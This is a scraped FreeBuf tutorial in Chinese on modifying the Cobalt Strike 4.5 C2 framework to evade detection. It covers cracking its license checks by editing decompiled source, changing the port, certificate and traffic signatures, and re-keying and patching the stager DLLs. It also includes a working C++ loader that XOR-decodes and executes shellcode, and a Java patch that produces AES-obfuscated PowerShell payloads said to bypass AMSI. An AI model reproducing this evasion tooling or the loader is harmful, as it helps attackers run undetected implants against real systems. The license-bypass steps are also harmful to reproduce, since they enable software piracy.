# 安全工具&CobalStrike免杀

---

**URL**: https://www.freebuf.com/articles/web/444537.html

**作者**: 2025-08-15 18:37:53所属地 河南省

**发布时间**: 2025-08-15 18:37:53

**爬取时间**: 2025-08-20T17:37:49.344714

---

## 正文

官方公众号企业安全新浪微博

![图片](../images/f43141f724f98ea95118b8af321c69fe.jpg)
FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](../images/58489bc90c4e5bff5ef6e4f8a8bafaae.jpg)
FreeBuf+小程序把安全装进口袋

安全工具&CobalStrike免杀

- Web安全

安全工具&CobalStrike免杀
2025-08-15 18:37:53
所属地 河南省
![图片](../images/b9059b82f9f584c38d557848f19ae621.png)
本文由
创作，已纳入
「FreeBuf原创奖励计划」
，未授权禁止转载
### CS前期配置

Cobalt Strike(简称为CS)是一款基于java的渗透测试工具，将所有攻击都变得简单、可视化，团队成员可以连接到同一个服务器上进行多人运动，共享攻击资源。

官网地址：https://www.cobaltstrike.com﻿

学习一下cs系列的二次开发，网上也有不少教程，但是在学习过程中也还是遇到不少坑，最开始是想研究下4.7版本的破解，但是4.7及以上的版本对于防破解做了很多改变，不再是双端共用了，服务端的二进制文件无疑是加大了破解难度，所以选择4.5版本进行研究学习，双端java，新手好评。

下载官方cs4.5版本jar包，记得校验sha256的值

#### CS修改默认端口

这里我们用到的是CobalStrike4.5版本。4.7,4.9暗桩很多，防止篡改机制

CS开启的默认端口是50050，蓝队在分析的时候，看到ip开放50050，一般都ban了，很明显是CS的端口，所以，我们需要修改50050端口。

服务端修改teamserver文件，将50050修改为其他端口，最下面代码

```
# start the team server.java -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=37533 -Dcobaltstrike.server_bindto=0.0.0.0 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=Microsoft -server -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./cobaltstrike.jar -javaagent:CSAgent.jar=f38eb3d1a335b252b58bc2acde81b542 -Duser.language=en server.TeamServer $*
```

#### https特征证书修改

在teamserver可以看到密码Microsoft

查看默认证书文件特征,可以使用Java的keytool工具进行证书的查看

keytool -list -v -keystore cobaltstrike.store

我们生成自己的证书

```
#生成格式keytool -genkey -keystore xxx.store -storepass password -keypass password -keyalg 加密方式 -alias 别名 -dname "证书颁发机构信息"​#自己生成keytool -genkey -keystore Cobal.store -storepass Admin@123 -keypass Admin@123 -keyalg RSA -alias Xuan -dname "CN=China, OU=Hehu, O=Waou, L=Long, S=Serce, C=noind"
```

服务端修改teamserver文件。也可以客户端修改传到服务端里面

if里面判断我们的文件是否存在，后面修改为Coabl.store,以及后面密码

```
if [ -e ./Cobal.store ]; thenprint_info "Will use existing X509 certificate and keystore (for SSL)"elseprint_info "Generating X509 certificate and keystore (for SSL)"keytool -keystore ./cobaltstrike.store -storepass Microsoft -keypass Microsoft -genkey -keyalg RSA -alias cobaltstrike -dname "CN=*.microsoft.com, OU=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=WA, C=US"fi​# start the team server.java -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=37533 -Dcobaltstrike.server_bindto=0.0.0.0 -Djavax.net.ssl.keyStore=./Cobal.store -Djavax.net.ssl.keyStorePassword=Admin@123 -server -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./cobaltstrike.jar -javaagent:CSAgent.jar=f38eb3d1a335b252b58bc2acde81b542 -Duser.language=en server.TeamServer $*
```

#### Profile文件

cs的profile文件可以修改流量特征以及修改beacon的默认行为，目的是为了让通信变得更加隐蔽。

我们首先需要知道profile文件具体可以修改以下几个部分的特征：

1. get请求内容
2. post请求内容
3. 被远程加载的beacon.dll的特征
4. 远程加载beacon.dll的uri
5. 进程注入的具体细节
6. 后渗透模块的特征修改

【CS】生成exe文件 64位的1.exe 2.exe -查看重复 32位的3.exe

使用wireshark观察流量特征http.request.method == "GET"

流量包里都含有一个/fwlink文件

```
GET /fwlink HTTP/1.1Accept: */*Cookie: AxBTp91gvPuDpx7o/MGsfP2xI0Dk5WgUEt4P194yvhy4BrGExzmD7gFCsMw+yDur5wAQNznwGDJxoJ6xXvE3IJCAJVnUbldiaH/mOvsxZYlGVaB6JpcGI/2B8D1OSR5b7OdvjKF1cy90GD9HDeei7cS7crQFBp/Hyqdb5+FdvCg=User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)Host: 192.168.16.109:4444Connection: Keep-AliveCache-Control: no-cache
```

那我们来修改这个特征

用./c2lint  jquery-c2.3.12.profile去测试

如何使用我们自定义的profile

teamserver  xxx.xxx.xxx.xxx xuan  xxx.profile

使用【CS】生成exe，查看流量http.request.method == "GET"

### 非功能性需求

先修改一些表面特征，没有做功能上操作

反编译要根据自己IDEA版本使用合适的Java版本进行反编译，一个一个试的。版本不行会出现报错。我这里使用了Java的11版本

```
#将代码进行反编译java -cp IDEA_HOME/plugins/java-decompiler/lib/java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true <src.jar> <dest dir>​#具体示例：  java  -cp "D:\software\IntelliJ IDEA 2025.1.2\plugins\java-decompiler\lib\java-decompiler.jar"  org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler   -dgs=true cobaltstrike.jar cobal
```

IDEA创建项目，名称CobalStrike

JDK选择1.8  Oracle  OPenJDK  version1.8.0_112

创建文件lib，放入cobalstrike.bar源文件【原始jar文件】

反编译的源码文件放过来，解压之后放过来创建项目的文件里面

工件-->添加jar-->来自具有依赖项

#### 设置弹窗+连接

设置一个弹窗，aggressor\Aggressor.java重构-->复制文件，路径结构保持一致

JOptionPane.showMessageDialog(null, "Welcome to XUAN团队!");

有弹窗之后有一个报错，java无法加载

在右上角运行/调试配置--->虚拟机选项，【编译】

-XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC出现新的报错

出现报错，认证文件无法加载。这个就是安装问题，大概修改6个文件，才能这个运行打包正常

修改几个文件后，查看CS功能是否正常，正常

**所有源码的修改都要复制源文件到src的对应目录下进行修改。**

需要修改6个文件里面的代码，就可以解决这个报错

参考文章 破解部分Cobalt Strike系列｜从0开始破解

beacon/BeaconData.java

beacon/CommandBuilder.java保持var1=true就行，也可以直接注释最后的if语句

common/Authorization.java主要授权校验函数，直接注释掉cobaltstrike.auth文件的校验，然后重新给var4赋值一个密钥，这个值是网上找的大佬破解密钥文件后的结果。

common/Helper.java注释掉class文件的调用，保证var2=true

common/Starter.java注释掉class文件的调用，保证var2=true

common/Starter2.java注释掉class文件的调用，保证var2=true

回显成功，直接启动客户端和服务端。

#### 个性化定制

在前面实验做成功了再做这个个性化定制

aggressor\AggressorClient.java79行代码修改

```
protected String title = "Cobalt Strike  XUAN个人定制";
```

界面修改 文件路径：aggressor/dialogs/ConnectDialog.java

45 行和 57 行

```
#45行修改this.options.addPage("New Profile", (Icon)null, "Connection  CS", (new Connect(this.window)).getContent(var3, "neo", "password", "127.0.0.1", "50050", "neo@127.0.0.1"));​#57行修改this.options.addPage(var12, (Icon)null, "Connection  CS", (new Connect(this.window)).getContent(var3, var7, var8, var6, var9, var10));
```

客户端和图标修改

介绍部分：resources/about.html

```
#第4行修改<center><h1>Cobalt Strike Xuan ver 4.5</h1></center>
```

许可部分：resources/credits.txt

图标位置：复制文件后进行替换

resources/armitage-icon.gif（32×32px）

resources/armitage-logo.gif（256×256px）

修改后结果

#### 主题风格修改

**使用FlatLaf主题库：**

Maven 仓库地址：https://mvnrepository.com/artifact/com.formdev/flatlaf/3.2

**操作步骤：**

下载flatlaf-3.2.jar，将 JAR 文件加入lib目录，在模块依赖中引用

工件-->已提取目录--加入文件

在aggressor/Aggressor.java中加入代码：55行

```
FlatIntelliJLaf.setup();
```

风格修改成功

### 特征修改

上线过程中有两个特征

运行EXE-->自动生成并访问特征1：符合checksum8校验的URL进行特征2：远程下载Stager-->上线

1. 杀毒软件 会检测stager 下载的文件（卡巴 DF就有这个功能）
2. 流量EDR 会检测stager 下载的文件

#### url路径位数

可以看出来，GET请求地址是通过一种算法形成长度均为4字符的请求地址,同一个exe执行会形成不同的get数据，但都是4位

POST请求地址是submit.php，一个id的参数，id里面的值不同

> cs 有一个checksum8算法64位=93，32位=9264位exe的GET数据Wn6b、2fzK。32位exe的GET数据JyTE

```
public class Checksum8Calculator {​public static void main(String[] args) {String input = "JyTE"; // 可以替换成任意字符串int checksum = calculateChecksum8(input);System.out.println("Checksum8 of \"" + input + "\": " + checksum);}​/*** 计算字符串的 Checksum8 校验和（ASCII 和模 256）* @param str 输入字符串* @return Checksum8 值（0-255）*/public static int calculateChecksum8(String str) {int sum = 0;for (int i = 0; i < str.length(); i++) {char c = str.charAt(i);sum += (int) c; // 累加 ASCII 值}return sum % 256; // 取模 256}}
```

Checksum8 of "Wn6b": 93

Checksum8 of "2fzK": 93

Checksum8 of "JyTE": 92

查看源代码中cloudstrike\WebServer.java

**条件：流量设备可以检测到http请求，如果检测到url路径位数是4位请求的checksum的结果为92或者93，就可以判断是cs**

修改文件cloudstrike\WebServer.java和common\CommonUtils.java

common\CommonUtils.java返回值强制修改为我们自定义的访问地址。第1384行和1399行return  "xxxx";。

checksum的结果通过上面的java代码自己控制

这个是cloudstrike\WebServer.java文件修改处

**注意：客户端服务端都进行替换,服务端的jar文件小写**

上线成功，32位和64位流量包均修改成功。

#### Stager环境测试

上线过程中有两个特征

运行EXE-->自动生成并访问特征1：符合checksum8校验的URL进行特征2：远程下载Stager-->上线

1. 杀毒软件 会检测stager 下载的文件（卡巴 DF就有这个功能）
2. 流量EDR 会检测stager 下载的文件

**exe文件进行测试**

使用原始的【CS】生成exe文件进行观察效果，生成监听端口4444x64的exe的文件111.exe，切换端口为9999重新生成x64的exe的文件222.exe

设置监听端口4444运行111.exe远程下载文件/ktI5

设置监听端口9999运行222.exe远程下载文件/YPnF

使用脚本解析Stager脚本Sentinel-One/CobaltStrikeParser

跟被检测文件放入同一个目录下

```
pip install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/python  parse_beacon_config.py  YPnFpython  parse_beacon_config.py  ktI5
```

**bin文件进行测试**

使用【CS】生成bin文件。bin文件进行xor异或处理

```
#include<Windows.h>#include <stdio.h>#include <fstream>#include<iostream>using namespace std;​void load(char* buf, int shellcode_size){DWORD dwThreadId; // 线程IDHANDLE hThread; // 线程句柄​char* shellcode = (char*)VirtualAlloc(NULL,shellcode_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE);​CopyMemory(shellcode, buf, shellcode_size);//CreateThread函数，创建线程hThread = CreateThread(NULL, // 安全描述符NULL, // 栈的大小(LPTHREAD_START_ROUTINE)shellcode, // 函数NULL, // 参数NULL, // 线程标志&dwThreadId // 若成功，接收新创建的线程的线程ID DWORD变量的地址。);//通过调用 WaitForSingleObject 函数来监视事件状态,当事件设置为终止状态（WaitForSingleObject 返回 WAIT_OBJECT_0）时，每个线程都将自行终止执行。WaitForSingleObject(hThread, INFINITE); // 一直等待线程执行结束}int wmain(int argc, char* argv[]){char filename[] = "p64+xor.bin";// 以读模式打开文件ifstream infile;//以二进制方式打开infile.open(filename, ios::out | ios::binary);infile.seekg(0, infile.end); //追溯到流的尾部int length = infile.tellg(); //获取流的长度infile.seekg(0, infile.beg);//回溯到流头部​char* data = new char[length]; //存取文件内容if (infile.is_open()) {cout << "reading from the file" << endl;infile.read(data, length);}cout << "size of data =" << sizeof(data) << endl;cout << "size of file =" << length << endl;for (int i = 0; i < length; i++){printf("\\%x ", data[i]);}​for (int i = 0; i < length; i++){data[i] ^= 0x39;}​int shellcode_size = length;load(data, shellcode_size);//加载成功并不会输出，推测load函数新创建的线程执行结束后，主进程也终止了。cout << "加载成功";return 0;}
```

使用之前的file+xor生成exe文件。file.exe+p64+xor.bin两个文件在卡巴斯基检测

没有检测到危险，点击运行。点击就kill

下面我们在本地wireshark来检测文件上线的流量。可以观察到还是会生成stager分阶段文件

不管是编译shellcode生成的exe，还是下载文件生成的exe都会下载文件。这个都是dll（0x2e算出来的）

**CS上线机制**

1. 杀毒软件 会检测stager 下载的文件（卡巴 DF就有这个功能）
2. 流量EDR 会检测stager 下载的文件

脚本检测stager流量python  parse_beacon_config.py  LbeJ

生成的文件，内容，大小都是一致的

#### Stager代码修改

LbeJ是sleeve\beacon.x64.dll进行异或和算法出来的

由于算法和异或或密钥是固定的，所以生成的文件也是固定的。特征会被杀毒和流量特征检测到。

参考网上其他师傅公开的资料，beacon/BeaconPayload的beacon_obfuscate方法对beacon的配置信息进行了异或混淆，异或的key是固定的，3.x是0x69，4.x为0x2e。

文件beacon\BeaconPayload.java,这里的46的16进制就是0x2E

步骤：先解密dll--->加密---->再改代码

流程：原型dll -- 算法 -- jar包打包dll --算法异或 --最终stager文件

操作：先解密dll，dll内置密钥0x2E改成自定义密钥，然后加密回去

修改完服务端beacon的混淆密钥，与之对应，需要修改sleeve目录下的dll文件。这些DLL文件默认是加密的，使用ca3tie1[4]师傅开发的CrackSleeve[5]程序解密这些DLL，在修改完密钥之后再加密回去即可。需要注意的是，在解密的时候需要将程序中默认的密钥改成4.5版本的

```
#下载地址https://github.com/ca3tie1/CrackSleevehttps://github.com/kyxiaxiang/CrackSleeve4.7https://github.com/kyxiaxiang/CrackSleeve4.5https://github.com/kyxiaxiang/CrackSleeve4.9https://github.com/kyxiaxiang/CrackSleeve4.8
```

使用工具解密后的文件可以看到

其中以x64结尾的是64位文件，x86或者没有后缀名的为32位文件。使用IDA打开sleeve\beacon.x64.dll，搜索0x2e，找到之后修改成与服务端相同的密钥即可。

Search-->Immediate value,输入0x2e。下面就是xor地方

Edit-->Patch program-->Change byte,修改加密key，修改成我们自定义的，这里写十六进制的数据

Edit-->Patch program-->Apply patches to input file 保存文件

注意，在替换jar包中的sleeve文件时，需要提前备份原来的文件，防止修改之后，出现错误，导致程序无法使用。

将修改好的文件放入...\CrackSleeve-main\Resource\Decode里面

然后执行命令。对文件进行加密操作.加密后的文件在...\CrackSleeve-main\Resource\Encode

IDEA上的文件操作：

**文件beacon\BeaconPayload.java,这里复制到src的修改成前面密钥的十进制数据**

【CrackSleeve】加密后的两个文件放入src对应的目录里面。

构建工件-->生成的jar文件。客户端和服务端的jar一致。

访问地址，下载成功，64位和32位上线成功。

按照cs会默认去下载文件。默认会下载的文件。流量检测没有识别

#### Powershell模板修改

CobalStrike目录下放入文件AES-Encoder.ps1，template.x64.ps1

一个是加密文件，一个是生成powershell模板文件

common\ResourceUtils.java文件修改

```
package common;​import aggressor.AggressorClient;import encoders.Base64;​import java.io.*;​import pe.BeaconLoader;​public class ResourceUtils extends BaseResourceUtils {public ResourceUtils(AggressorClient var1) {super(var1);}​public byte[] _buildPowerShellHint(byte[] var1, String var2) throws IOException {InputStream var3 = CommonUtils.resource("resources/template.hint." + var2 + ".ps1");byte[] var4 = CommonUtils.readAll(var3);var3.close();String var5 = CommonUtils.bString(var4);int var6 = BeaconLoader.getLoaderHint(var1, var2, "GetModuleHandleA");int var7 = BeaconLoader.getLoaderHint(var1, var2, "GetProcAddress");AssertUtils.Test(var6 >= 0, "GetModuleHandleA hint for " + var2 + " was not found. Your PowerShell script will crash.");AssertUtils.Test(var7 >= 0, "GetProcAddress hint for " + var2 + " was not found. Your PowerShell script will crash.");byte[] var8 = new byte[]{35};var1 = CommonUtils.XorString(var1, var8);var5 = CommonUtils.strrep(var5, "%%DATA%%", Base64.encode(var1));var5 = CommonUtils.strrep(var5, "%%GMH_OFFSET%%", var6 + "");var5 = CommonUtils.strrep(var5, "%%GPA_OFFSET%%", var7 + "");return CommonUtils.toBytes(var5);}​public byte[] _buildPowerShellNoHint(byte[] var1, String var2) throws IOException, InterruptedException {ProcessBuilder pb = new ProcessBuilder("powershell","-ExecutionPolicy", "Bypass","-Command", "Import-Module .\\AES-Encoder.ps1; Invoke-AES-Encoder -InFile .\\template.x64.ps1 -OutFile x64.ps1 -Iterations 6");pb.directory(new File("C:\\Users\\31062\\CobalStrike")); // 设置工作目录Process process = pb.start();​// 捕获标准输出BufferedReader stdoutReader = new BufferedReader(new InputStreamReader(process.getInputStream()));String line;while ((line = stdoutReader.readLine()) != null) {System.out.println("STDOUT: " + line);}​// 捕获错误输出BufferedReader stderrReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));while ((line = stderrReader.readLine()) != null) {System.err.println("STDERR: " + line);}​int exitCode = process.waitFor();System.out.println("Exit Code: " + exitCode);​​InputStream var3 = CommonUtils.resource("x64.ps1");byte[] var4 = CommonUtils.readAll(var3);var3.close();String var5 = CommonUtils.bString(var4);byte[] var6 = new byte[]{35};var1 = CommonUtils.XorString(var1, var6);var5 = CommonUtils.strrep(var5, "%%DATA%%", Base64.encode(var1));return CommonUtils.toBytes(var5);}​public byte[] _buildPowerShell(byte[] var1, boolean var2) {try {String var3 = CommonUtils.arch(var2);return BeaconLoader.hasLoaderHint(this.client, var1, var3) ? this._buildPowerShellHint(var1, var3) : this._buildPowerShellNoHint(var1, var3);} catch (IOException var4) {MudgeSanity.logException("buildPowerShell", var4, false);return new byte[0];} catch (InterruptedException e) {throw new RuntimeException(e);}}}
```

生成文件，生成即免杀。绕过AMSI检测和AES加密

### 涉及资源

Cobalt Strike系列｜从0开始破解

https://mvnrepository.com/artifact/com.formdev/flatlaf/3.2

解析Stager脚本Sentinel-One/CobaltStrikeParser

CobaltStrike魔改与增强

https://github.com/ca3tie1/CrackSleevehttps://github.com/kyxiaxiang/CrackSleeve4.7https://github.com/kyxiaxiang/CrackSleeve4.5https://github.com/kyxiaxiang/CrackSleeve4.9https://github.com/kyxiaxiang/CrackSleeve4.8

# 系统安全
# 免杀工具
# CobaltStrike免杀
免责声明
1.一般免责声明：
本文所提供的技术信息仅供参考，不构成任何专业建议。读者应根据自身情况谨慎使用且应遵守《中华人民共和国网络安全法》，作者及发布平台不对因使用本文信息而导致的任何直接或间接责任或损失负责。
2. 适用性声明：
文中技术内容可能不适用于所有情况或系统，在实际应用前请充分测试和评估。若因使用不当造成的任何问题，相关方不承担责任。
3. 更新声明：
技术发展迅速，文章内容可能存在滞后性。读者需自行判断信息的时效性，因依据过时内容产生的后果，作者及发布平台不承担责任。
![图片]
![图片](../images/b9059b82f9f584c38d557848f19ae621.png)
已在FreeBuf发表
篇文章
本文为
独立观点，未经授权禁止转载。
如需授权、对文章有疑问或需删除稿件，请联系 FreeBuf
                客服小蜜蜂（微信：freebee1024）
被以下专辑收录，发现更多精彩内容
相关推荐
![图片]
- 0文章数

文章目录
CS前期配置
- CS修改默认端口
- https特征证书修改
- Profile文件

非功能性需求
- 设置弹窗+连接
- 个性化定制
- 主题风格修改

特征修改
- url路径位数
- Stager环境测试
- Stager代码修改
- Powershell模板修改

涉及资源
